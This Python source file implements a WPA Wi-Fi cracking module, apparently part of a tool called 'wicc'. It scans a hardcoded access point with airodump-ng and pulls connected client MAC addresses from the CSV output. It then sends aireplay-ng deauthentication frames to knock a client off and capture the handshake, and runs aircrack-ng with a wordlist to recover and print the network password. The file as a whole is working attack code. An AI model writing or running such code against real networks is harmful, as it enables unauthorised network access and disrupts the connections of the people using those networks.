from wicc_enc_type import EncryptionType
from wicc_network import Network
from wicc_interface import Interface
from subprocess import Popen,PIPE
import threading
import time,sys
import os
import csv

class WPA(EncryptionType):

    def __init__(self,network, interface, verbose_level):

        """
        Constructor for the WPA class (also calls the parent constructor)
        :param network: target network for the attack
        :param interface: selected wireless interface
        :param verbose_level: verbose level set by main

        :Author: Adam Chalkley and Miguel Yanes Fern√°ndez
        """


        EncryptionType.__init__(self, network, interface, verbose_level)
        
        self.clients = []
        self.client_count = 0
        self.current_client = 0
        self.clients_found = False
        self.scanning_started = False
        self.cracked = False
        self.password = ""

    def execute_command(self,command,count):

        process = Popen(command)
        time.sleep(count)
        process.terminate()

    

    def filter_clients(self):
        # method to filter clients from the csv file created by Airodump-ng
        # @param file path to be executed/read from
        # returns a list of clients connected to the access point
        """
        Method to filter clients from the csv file generated by Airodump-ng
        returns a list of clients connected to the access point

        :Author: Adam Chalkley
        """
        
        csv_file = open("files/tester_two-01.csv", "r")
        lines = []
        clients = []
        while True:
            line = csv_file.readline()

            if not line:
                 break

            # check if line is empty
            lineStripped = line.strip()
            if lineStripped == "":
                continue
            
            lines.append(line)

        client_start = False

        for line in lines:
            words = line.split(',')

            if client_start and words[0] != " ":
                    clients.append(words[0])

            if words[0] == "Station MAC":
                    client_start = True

        return clients

    def check_if_captured(self):
        
        """
        Method to check if Password was sucessfully captured

        :Author: Adam Chalkley
        """

        try:
            captured = open('files/captured.csv')
            self.password = captured.read()
        except:
            print(" Error :: File was not created ")
            return False
        
        if self.password != "":
            print("Success Password found")
            print( "Password = " + self.password)
            return True
            
        return False

    def scan_network(self,directory):
        
        self.execute_command(['rm', '-r', directory],3)
        self.execute_command(['mkdir', directory],3)
        ap = '90:5C:44:24:46:C3'
        tempfile = directory
        tempfile += "/tester_two"
        
        command = ['airodump-ng', "wlan0", '--write', tempfile, '--output-format', 'csv',
        '--bssid','90:5C:44:24:46:C3','--channel','11']
        print("starting")
        thread = threading.Thread(target=self.execute_command , args= (command, 30))
        thread.start()
        thread.join()

        if not self.scanning_started:

            self.clients = self.filter_clients()
            self.scanning_started = True

        for client in self.clients:
            
            self.client_count += 1

        if(self.client_count == 0):
            self.clients_found = False
            return

        client = self.clients[self.current_client]
        print("KICKING " + self.clients[self.current_client])
        time.sleep(10)
        ap = '90:5C:44:24:46:C3'
        command = ['airodump-ng','wlan0','--write','files/testo', '--bssid', ap,
        '--channel', '11']
        threadOne = threading.Thread(target=self.execute_command,args=(command,50))
        threadOne.start()
        threadOne.join(10)

        #deauth 
        command = ['aireplay-ng', '--deauth', '4','-a', ap, '-c', client, 'wlan0']
        deauth_thread = threading.Thread(target= self.execute_command, args=( command, 6))
        deauth_thread.start()
        deauth_thread.join()

    def crack_network(self):
        time.sleep(12)
        command = (['aircrack-ng','files/testo-01.cap','-w','tests.txt',
        '-l','files/captured.csv'])
        aircrack_thread = threading.Thread(target=self.execute_command,args=(command, 30 ))
        aircrack_thread.start()
        aircrack_thread.join()

        self.check_if_captured()
        return self.password
